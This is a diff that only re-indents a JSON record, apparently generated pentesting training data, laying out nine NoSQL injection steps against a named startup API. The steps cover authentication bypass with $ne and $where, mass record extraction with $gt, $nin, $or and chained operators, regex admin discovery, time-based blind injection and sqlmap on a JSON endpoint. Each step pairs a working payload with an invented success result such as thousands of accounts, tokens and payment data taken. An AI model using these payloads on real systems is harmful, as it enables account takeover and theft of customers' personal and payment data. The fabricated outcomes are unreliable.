@@ -8,7 +8,15 @@
       "step_number": 1,
       "tool": "nosql_injection_testing",
       "action": "Test login endpoint with NoSQL operator injection to bypass authentication",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/auth/login", "payload": {"username": "admin", "password": {"$ne": ""}}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/auth/login",
+        "payload": {
+          "username": "admin",
+          "password": {
+            "$ne": ""
+          }
+        }
+      },
       "expected_result": "Authentication bypassed! Received JWT token with admin privileges - MongoDB $ne (not equal) operator returns true for any password not matching empty string",
       "explanation": "NoSQL operator injection exploits MongoDB query operators when user input isn't properly validated"
     },
@@ -16,7 +24,17 @@
       "step_number": 2,
       "tool": "nosql_injection_testing",
       "action": "Extract all user accounts using $gt operator",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/users", "payload": {"username": {"$gt": ""}, "password": {"$gt": ""}}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/users",
+        "payload": {
+          "username": {
+            "$gt": ""
+          },
+          "password": {
+            "$gt": ""
+          }
+        }
+      },
       "expected_result": "All 3,482 user accounts extracted including usernames, emails, roles - $gt (greater than) empty string matches all documents in collection",
       "explanation": "Comparison operators like $gt, $gte, $lt can be abused to match all records"
     },
@@ -24,7 +42,15 @@
       "step_number": 3,
       "tool": "nosql_injection_testing",
       "action": "Use regex injection to search for admin accounts",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/search", "payload": {"query": {"$regex": "admin.*", "$options": "i"}}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/search",
+        "payload": {
+          "query": {
+            "$regex": "admin.*",
+            "$options": "i"
+          }
+        }
+      },
       "expected_result": "Found 8 admin accounts: admin, admin_backup, site_admin, db_admin, system_admin, support_admin, api_admin, super_admin - case-insensitive regex matched all variations",
       "explanation": "$regex operator enables pattern matching - useful for discovering privileged accounts"
     },
@@ -32,7 +58,15 @@
       "step_number": 4,
       "tool": "nosql_injection_testing",
       "action": "Test $where JavaScript injection for code execution",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/auth/login", "payload": {"username": "admin", "password": {"$where": "return true"}}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/auth/login",
+        "payload": {
+          "username": "admin",
+          "password": {
+            "$where": "return true"
+          }
+        }
+      },
       "expected_result": "JavaScript injection successful - authenticated as admin using arbitrary code execution in $where clause, returned valid session token",
       "explanation": "$where allows JavaScript execution in queries - extremely dangerous if not disabled"
     },
@@ -40,7 +74,22 @@
       "step_number": 5,
       "tool": "nosql_injection_testing",
       "action": "Use $or logical operator to extract privileged user accounts",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/users/search", "payload": {"$or": [{"role": "admin"}, {"role": "superuser"}, {"role": "owner"}]}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/users/search",
+        "payload": {
+          "$or": [
+            {
+              "role": "admin"
+            },
+            {
+              "role": "superuser"
+            },
+            {
+              "role": "owner"
+            }
+          ]
+        }
+      },
       "expected_result": "Extracted 24 privileged accounts with full access permissions, API keys, and privilege levels including production database access credentials",
       "explanation": "Logical operators like $or, $and, $nor can be chained to create complex queries"
     },
@@ -48,7 +97,18 @@
       "step_number": 6,
       "tool": "nosql_injection_testing",
       "action": "Extract sensitive user data using $nin (not in) operator",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/query", "payload": {"user": {"$nin": ["guest", "anonymous", "test"]}}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/query",
+        "payload": {
+          "user": {
+            "$nin": [
+              "guest",
+              "anonymous",
+              "test"
+            ]
+          }
+        }
+      },
       "expected_result": "Extracted 3,479 real user accounts excluding test users - includes bcrypt password hashes, personal emails, phone numbers, OAuth tokens, payment information",
       "explanation": "$nin (not in) useful for filtering out unwanted records and focusing on production data"
     },
@@ -56,7 +116,11 @@
       "step_number": 7,
       "tool": "sqlmap_post_injection",
       "action": "Test POST endpoint with JSON injection using sqlmap",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/orders", "post_data": "{\"user_id\":\"123\",\"status\":\"pending\"}", "content_type": "application/json"},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/orders",
+        "post_data": "{\"user_id\":\"123\",\"status\":\"pending\"}",
+        "content_type": "application/json"
+      },
       "expected_result": "JSON parameter 'user_id' vulnerable to injection - able to manipulate queries despite being JSON format, extracted order database structure",
       "explanation": "Even JSON APIs can be vulnerable if parameters are directly concatenated into queries"
     },
@@ -64,7 +128,10 @@
       "step_number": 8,
       "tool": "manual_sql_injection_testing",
       "action": "Test for time-based NoSQL injection to confirm blind injection",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/search", "payload": "?query[$where]=sleep(5000)||true"},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/search",
+        "payload": "?query[$where]=sleep(5000)||true"
+      },
       "expected_result": "Response delayed 5.234 seconds - time-based injection confirmed, enables blind data extraction character by character even without visible output",
       "explanation": "Time-based techniques work in NoSQL too - useful when error messages are suppressed"
     },
@@ -72,7 +139,31 @@
       "step_number": 9,
       "tool": "nosql_injection_testing",
       "action": "Chain multiple operators to extract complete customer database",
-      "parameters": {"target_url": "https://api.startuptech.com/v1/customers", "payload": {"$and": [{"role": {"$ne": "test"}}, {"created_at": {"$gte": "2024-01-01"}}, {"subscription": {"$in": ["premium", "enterprise"]}}]}},
+      "parameters": {
+        "target_url": "https://api.startuptech.com/v1/customers",
+        "payload": {
+          "$and": [
+            {
+              "role": {
+                "$ne": "test"
+              }
+            },
+            {
+              "created_at": {
+                "$gte": "2024-01-01"
+              }
+            },
+            {
+              "subscription": {
+                "$in": [
+                  "premium",
+                  "enterprise"
+                ]
+              }
+            }
+          ]
+        }
+      },
       "expected_result": "Extracted 847 premium customer records created in 2024 including payment methods, subscription details, usage analytics, billing addresses - targeted query maximized valuable data",
       "explanation": "Complex operator chains enable surgical data extraction targeting most valuable records"
     }
@@ -92,7 +183,11 @@
     "created_by": "neural_mesh_v5.2_generator",
     "category": "pentesting",
     "subcategory": "nosql_injection",
-    "tools_used": ["nosql_injection_testing", "sqlmap_post_injection", "manual_sql_injection_testing"],
+    "tools_used": [
+      "nosql_injection_testing",
+      "sqlmap_post_injection",
+      "manual_sql_injection_testing"
+    ],
     "estimated_time": "60-75 minutes",
     "authorization_required": true,
     "severity": "critical",
